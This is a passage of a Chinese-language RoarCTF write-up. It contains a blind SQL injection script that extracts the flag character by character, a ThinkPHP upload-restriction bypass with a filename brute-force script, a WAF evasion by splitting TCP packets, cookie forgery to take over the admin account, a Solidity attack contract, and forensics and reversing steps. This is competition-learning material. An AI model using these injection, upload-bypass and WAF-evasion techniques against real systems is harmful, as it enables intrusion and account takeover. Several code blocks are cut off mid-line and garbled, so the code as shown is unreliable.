        while True:
            m = (l + r) / 2
            print l, m, r
            if brute_column(i + 1, chr(m)):
                if m == l:
                    column += chr(l)
                    break
                l = m
            else:
                if m == l:
                    column += chr(l)
                    break
                r = m
        print column
    '''
    flag = ''
    for i in range(len(flag),999):
        l = 0
        m = 0
        r = 0xff
        while True:
            m = (l + r) / 2
            print l, m, r
            if brute_flag(i + 1, chr(m)):
                if m == l:
                    flag += chr(l)
                    break
                l = m
            else:
                if m == l:
                    flag += chr(l)
                    break
                r = m
        print flag
然后拿到假flag：`flag{G1zj1n_W4nt5_4_91r1_Fr1end}`
第二行记录才是真flag：`RoarCTF{wm-fb3a5c2a0093f22a}`
###  simple_upload
`thinkphp` 的上传demo，`allowExts` 没啥用，其它格式的文件也能上传。
不过限制了`.php`，仔细看才发现，只有 `$_FILES['file']` 做了限制，所以上传多个文件就能绕过了。
然后文件名默认根据 `uniqid` 生成，同时上传文件，挺相近的，可以爆破一下。
附上上传和爆破文件名的脚本：
    import requests
    url = "http://***.4hou.com.cn:34133"
    path = url + "/index.php/home/index/upload"
    files = {"file":("a.txt",'a'), "file1":("a.php", ' 0 {
                nw, ew := server.Write(buf[0:nr])
                if ew != nil {
                    break
                }
                if nr != nw {
                    break
                }
            }
            if er != nil {
                break
            }
        }
        return true
    }
此处waf可绕过。它以 `rnrn` 分割包，取后面的进行waf过滤，所以建立tcp socket，分包发，就能绕过过滤。
然后可以注入得到 `secret表secret字段` 的内容，用来构造 `cookie`，这样就能登录 `admin` 账号了。
然后审了很久都没审出来如何利用。后来放了提示 `Go slice feature`，网上找到相同的利用点。
[Teaser CONFidence CTF 2019 “The Lottery”
Writeup](https://www.jianshu.com/p/2e3f0018b0d6)
同样的利用方法。
伪造cookie登录admin，start启动casino。然后注册一个普通账号，beg 3次，join 进去 pending
list。回到管理员，addplayer将这个普通账号添加到formal
player。回到普通账号，再beg一次。等5分钟后这一轮casino结束，普通账号查看个人info，就能看到flag。
## Misc
###  黄金六年
首先将文件解压出来得到一个 mp4 的压缩包，常规思路使用 binwalk 分析一下，没有发现什么
strings 分析字符串，发现有一段 base64 编码的字符
尝试进行 base64 解码，会发现是 rar 的压缩包文件
提取到本地，尝试进行解压发现需要密码
在视频中尝试寻找密码，使用 imovie 打开视频文件，在寻找关键帧的时候会发现二维码
总共可以发现四个二维码，扫码之后拼接 key 得到：iwantplayctf
最后解压就得到 flag
flag：roarctf{CTF-from-RuMen-to-RuYuan}
###  TankGame
下载以后发现是一个unity 3D的游戏，直接去找Assembly-CSharp.dll文件，用ILspy反编译一下C#的代码，各个函数如下图所示：
在MapManager可以看到地图和flag的生成条件为Destroynum==4或者Destroynum==5时：
地图和游戏的地图是一一对应的，空是8，基地是0，水是4，草地是5，砖块是1
在bullect这个类里可知，砖头和基地可被破坏，破坏后基地会变为9，砖块会变为空也就是8，子弹只有击中砖块或者基地时DestroyNum才会增长，所以直接编写代码爆破DestroyNum为4或者为5时的所有情况。
    str1 = str1.replace("0","9")
    for i in range(len(x)):
        for j in range(i+1, len(x)):
            for k in range(j+1, len(x)):
                str2 = str1[:x[i]] + '8' + str1[x[i]+1:x[j]] + '8' + str1[x[j]+1:x[k]] + '8' + str1[x[k]+1:]
                result = hashlib.sha1(str2).hexdigest()
                if result == "3f649f708aafa7a0a94138dc3022f6ea611e8d01":
                    print str2
结果为:
    clearlove9888888888888888888845811111188884882888851888181848858288881884811588888248118818515888885881588881888888188888888181588188188114888881884188518888842888118582851488815189148888888888888811818821885218888888848821182181888118844884248488884881288881881818811588888888188888811528888888828888481828158848888882818818818225888218888284581125888888888888888888
编写脚本并使用程序内置的MD5函数得到结果如下图所示：
###  forensic
发现是内存取证，使用Volatility内存取证神器。
首先收集一下信息，在使用mftparser插件时发现了flag.zip 和 flag.rar
`volatility -f mem.raw --profile=Win7SP1x86 mftparser > mft.txt`
内容很多，随查找了一下flag关键字。
继续查找flag关键字，找到了flag.zip 和 flag.rar 的十六进制 dump 下来
在压缩包里发现了flag.txt，接下来思路是找到 压缩包的密码
首先简单看了下图片。
`volatility -f mem.raw --profile=Win7SP1x86 filescan | grep "png|jpg|jpeg"`
filesacn发现在我的文档，图片，文件夹里，有张图片 ，dumpfiles 下来就是flag.zip 的密码，成功拿到flag
在剪贴板中还发现了百度云链接，`https://pan.baidu.com/s/12hQlubfkvdQhASi0dWs_5Q`
后续很多步骤 最后并没有和flag.zip 串起来，就不细说了
## Crypto
###  CoinFlip
给了一个ropsten测试链的地址
查看智能合约代码,
只要循环调用Ap()和Transfer()500次就能getflag.
但是有gas限制,分成5次提交.
    contract attack {
        address attacker ;
        function attack()  {attacker = msg.sender;}
        function start(address victim,address receive)  {
            for (uint i = 1; i 
使用 angr 进行化简，得到关键算法。  
程序两个循环，外层循环六次，每次拿 8 个字节，内层循环 64 次，进行加密。
加密伪代码:
    i=0
    #x=?
    while(i=0:
            x=x
    char encode[48] = { 0x96, 0x62, 0x53, 0x43, 0x6D, 0xF2, 0x8F, 0xBC, 0x16, 0xEE,0x30, 0x05, 0x78, 0x00, 0x01, 0x52, 0xEC, 0x08, 0x5F, 0x93,
              0xEA, 0xB5, 0xC0, 0x4D, 0x50, 0xF4, 0x53, 0xD8, 0xAF, 0x90,
              0x2B, 0x34, 0x81, 0x36, 0x2C, 0xAA, 0xBC, 0x0E, 0x25, 0x8B,
              0xE4, 0x8A, 0xC6, 0xA2, 0x81, 0x9F, 0x75, 0x55 };
    int main() {
        long long* e = (long long*)encode;
        for (size_t i = 0; i > 1;}
                else {
                    e[i] = ((unsigned long long)e[i] ^ 0xB0004B7679FA26B3) >> 1;
                    e[i] |= 0x8000000000000000;
                }
            }
        }
        for (size_t i = 0; i < 48; i++)
        {
            printf("%c", encode[i]);
        }
    }